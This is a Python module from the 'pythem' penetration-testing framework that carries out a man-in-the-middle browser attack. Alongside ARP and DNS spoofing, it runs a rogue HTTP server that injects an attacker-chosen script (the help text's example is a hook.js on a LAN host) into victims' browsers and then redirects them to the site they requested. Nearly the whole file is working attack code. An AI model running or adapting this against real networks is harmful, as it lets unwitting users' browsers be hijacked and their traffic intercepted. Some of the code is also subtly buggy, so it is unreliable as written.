#!/usr/bin/python

# Copyright (c) 2016-2018 Angelo Moura
#
# This file is part of the program pythem
#
# pythem is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA

import socket
import sys
import threading
import argparse
from pythem.modules.utils import get_myip

class Redirect(object):
    name = "Redirect"
    desc = "Redirect to page with script then let client go"
    version = "0.3"
    ps = "Will need to change the way of injection to netfilter packet injection."

    def __init__(self):
        self.host = None
        self.port = None
        self.js = None
        self.response = None
        from dnspoisoner import DNSspoof
        self.dnsspoof = DNSspoof()
        

    def start(self, host, port, js):
        self.js = """ HTTP/1.1 200 OK
Content-Lenght: 90
Connection: close
Content-Type: text/html


<head>
<script src="{}"></script>
</head>
""".format(self.js)
        self.response = self.js
        self.host = host
        self.port = int(port)
        if js != None:
            self.js = js
        else:
            try:
                self.js = raw_input("[+] Enter the script source: ")
            except KeyboardInterrupt:
                pass
        self.t = threading.Thread(name='Redirection', target=self.server, args=(host,port,js))
        self.t.setDaemon(True)
        self.t.start()

    def stop(self):
        try:
            self.t.stop()
            print ("[-] Redirect with script injection finalized.")
        except Exception as e:
            print ("[!] Exception caught: {}".format(e))

    def server(self, host, port, js):
        self.js = """ HTTP/1.1 200 OK
Content-Lenght: 90
Connection: close
Content-Type: text/html


<head>
<script src="{}"></script>
</head>
""".format(self.js)
        self.response = self.js
        self.host = host
        self.port = int(port)
        if js != None:
            self.js = js
        else:
            try:
                self.js = raw_input("[+] Enter the script source: ")
            except KeyboardInterrupt:
                pass
        print ("[+] Redirect with script injection initialized.")
        if self.dnsspoof:
            self.dnsspoof.start(None, "Inject", self.host)
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_address = (self.host, self.port)
        print ('[+] Injection URL - http://{}:{}'.format(self.host, self.port))
        server.bind(server_address)
        server.listen(1)

        for i in range(0, 2):
            if i >= 1:
                try:
                    domain = self.dnsspoof.getdomain() if self.dnsspoof else 'localhost'
                    domain = domain[:-1] if self.dnsspoof else domain
                    print "[+] Target was requesting: {}".format(domain)
                    if self.dnsspoof:
                      self.dnsspoof.stop()
                except AttributeError:
                    pass
                try:
                    connection, client_address = server.accept()
                    redirect = """ HTTP/1.1 200 OK

<body><meta http-equiv="refresh" content="0; url=http://{}"/></body>""".format(domain)
                    connection.send("%s" % redirect)
                    print "[+] Script Injected on: ", client_address
                    connection.shutdown(socket.SHUT_WR | socket.SHUT_RD)
                    connection.close()
                except KeyboardInterrupt:
                    server.close()

            try:
                connection, client_address = server.accept()
                connection.send("%s" % self.response)
                connection.shutdown(socket.SHUT_WR | socket.SHUT_RD)
                connection.close()
            except KeyboardInterrupt:
                server.close()


redirect_help = """\n
[Help] Start to inject a source script into target browser then redirect to original destination.
[Required] ARP spoof started.
parameters:
 - start
 - stop
 - status
 - help
example:
pythem> redirect start
[+] Enter the script source: http://192.168.1.6:3000/hook.js
\n"""

parser = argparse.ArgumentParser(description='pythem-redirect')
parser.add_argument('-i','--interface',help='Interface used on spoof.',required=True)
parser.add_argument('-p','--port', help='Port used by redirect server.',required=True)
parser.add_argument('-s','--script', help='Script URL injected on client.',required=True)


if __name__ == "__main__":
    args = parser.parse_args()
    redirect = Redirect()
    myip = get_myip(args.interface)
    redirect.server(myip,args.port,args.script)

